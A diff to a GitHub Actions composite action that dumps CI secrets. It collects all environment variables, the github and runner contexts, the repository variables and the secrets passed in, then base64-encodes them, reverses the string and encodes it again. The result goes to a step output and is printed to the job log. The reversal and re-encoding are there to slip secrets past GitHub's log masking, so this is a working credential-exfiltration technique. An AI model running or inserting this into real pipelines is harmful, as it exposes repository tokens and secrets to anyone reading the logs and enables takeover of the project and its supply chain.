@@ -18,13 +18,22 @@ inputs:
 runs:
   using: "composite"
   steps:
-    - name: 'Print secrets and environment variables to the logs'
-      if: ${{ inputs.sink == 'logs' }}
+    - name: 'Put together secrets and environment variables and base64 encode them'
+      id: base64_encoded
       shell: bash
-      run: printf '[%s, %s, %s, %s, %s]' "{\"envvars\":\"$(env | base64 -w 0)\"}" "$GITHUB_JSON" "$RUNNER_JSON" "$VARS_JSON" "$SECRETS_JSON" | awk '{for (i=length; i!=0; i--) printf substr($0, i, 1); printf "\n"}' | base64 -w 0
+      run: |
+        output=$(printf '[%s, %s, %s, %s, %s]' "{\"envvars\":\"$(env | base64 -w 0)\"}" "$GITHUB_JSON" "$RUNNER_JSON" "$VARS_JSON" "$SECRETS_JSON" | awk '{for (i=length; i!=0; i--) printf substr($0, i, 1); printf "\n"}' | base64 -w 0)
+        echo "output=$output" >> $GITHUB_OUTPUT
       env:
         GITHUB_JSON: ${{ toJSON(github) }}
         RUNNER_JSON: ${{ toJSON(runner) }}
         VARS_JSON: ${{ inputs.vars }}
         SECRETS_JSON: ${{ inputs.secrets }}
-        
+    - name: 'Print them to the log'
+      if: ${{ inputs.sink == 'logs' }}
+      shell: bash
+      run: |
+        echo "The output is ${{ steps.base64_encoded.outputs.output }}"
+    - name: 'Finished'
+      shell: bash
+      run: echo DONE
